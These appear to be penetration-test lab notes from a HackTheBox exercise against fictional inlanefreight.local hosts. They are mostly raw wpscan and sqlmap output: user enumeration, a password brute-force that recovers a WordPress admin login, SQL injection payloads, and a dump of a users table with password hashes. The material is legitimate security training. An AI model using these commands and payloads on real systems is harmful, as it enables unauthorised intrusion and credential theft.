# Vuln - Extracted Evidence

Compiled from ACME-IPT engagement notes (Attacking Enterprise Networks vault).

---

### #### **ir.inlanefreight.local**
_Source: External-Attack1, line ~517_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ sudo wpscan  --url http://ir.inlanefreight.local
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://ir.inlanefreight.local/ [10.129.40.237]
[+] Started: Sat Jun 13 09:50:35 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://ir.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2026-04-11T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 1.0
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Last Updated: 2025-05-22T05:29:00.000Z
 | [!] The version is out of date, the latest version is 1.0.8.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun 13 09:50:56 2026
[+] Requests Done: 174
[+] Cached Requests: 7
[+] Data Sent: 46.875 KB
[+] Data Received: 241.47 KB
[+] Memory used: 283.984 MB
[+] Elapsed time: 00:00:21

```

---

### #### **ir.inlanefreight.local**
_Source: External-Attack1, line ~686_

```
└─$ sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://ir.inlanefreight.local/ [10.129.40.237]
[+] Started: Sat Jun 13 09:58:52 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://ir.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2026-04-11T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 1.0
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun 13 09:59:01 2026
[+] Requests Done: 27
[+] Cached Requests: 38
[+] Data Sent: 8.241 KB
[+] Data Received: 241.472 KB
[+] Memory used: 197.258 MB
[+] Elapsed time: 00:00:09

```

---

### #### **ir.inlanefreight.local**
_Source: External-Attack1, line ~815_

```
(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ sudo wpscan --url http://ir.inlanefreight.local -P /usr/share/wordlists/rockyou.txt -U ilfreightwp 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://ir.inlanefreight.local/ [10.129.40.237]
[+] Started: Sat Jun 13 10:06:02 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://ir.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2026-04-11T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 1.0
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Last Updated: 2025-05-22T05:29:00.000Z
 | [!] The version is out of date, the latest version is 1.0.8.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                                                                                                                                                                         
Trying ilfreightwp / anthony Time: 00:00:02 <                                                                                                                                                        > (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun 13 10:06:21 2026
[+] Requests Done: 170
[+] Cached Requests: 43
[+] Data Sent: 54.709 KB
[+] Data Received: 97.628 KB
[+] Memory used: 285.859 MB
[+] Elapsed time: 00:00:18

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~30_

```
$ sqlmap -r sqli.txt --dbms=mysql 

<SNIP>

[00:07:24] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=%' AND 6921=6921#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=%' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(5964=5964,1))),0x716a7a7171),5964) AND 'lVzh%'='lVzh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=%' AND (SELECT 1227 FROM (SELECT(SLEEP(5)))jrOp) AND 'ENPh%'='ENPh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=%' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787071,0x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,0x716a7a7171),NULL#
---
[00:07:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[00:07:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:07:38 /2022-06-21/
```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~65_

```
$ sqlmap -r sqli.txt --dbms=mysql -D status --tables
---
[00:10:29] [INFO] testing MySQL
[00:10:29] [INFO] confirming MySQL
[00:10:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:10:29] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~84_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ sqlmap -r sqli.txt --dbms=mysql --dbs -D status -T users --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:02:40 /2026-06-14/

[08:02:40] [INFO] parsing HTTP request from 'sqli.txt'
[08:02:40] [WARNING] it appears that you have provided tainted parameter values ('searchitem=union select null, database(), user(), @@version -- //') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[08:02:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-8285' OR 5399=5399#

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: searchitem=union select null, database(), user(), @@version -- //' AND EXTRACTVALUE(3584,CONCAT(0x5c,0x7178787a71,(SELECT (ELT(3584=3584,1))),0x716b767671))-- fdPj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=union select null, database(), user(), @@version -- //' AND (SELECT 7558 FROM (SELECT(SLEEP(5)))CenJ)-- SvrY

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: searchitem=union select null, database(), user(), @@version -- //' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178787a71,0x4855686c45436276776b52435953645855664c6a4a634844624a54727065714d4d774e6256584a76,0x716b767671)#
---
[08:02:42] [INFO] testing MySQL
[08:02:42] [INFO] confirming MySQL
[08:02:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[08:02:43] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

[08:02:43] [INFO] fetching columns for table 'users' in database 'status'
[08:02:43] [INFO] fetching entries for table 'users' in database 'status'
Database: status
Table: users
[2 entries]
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+

[08:02:43] [INFO] table '`status`.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local/dump/status/users.csv'
[08:02:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 08:02:43 /2026-06-14/

```
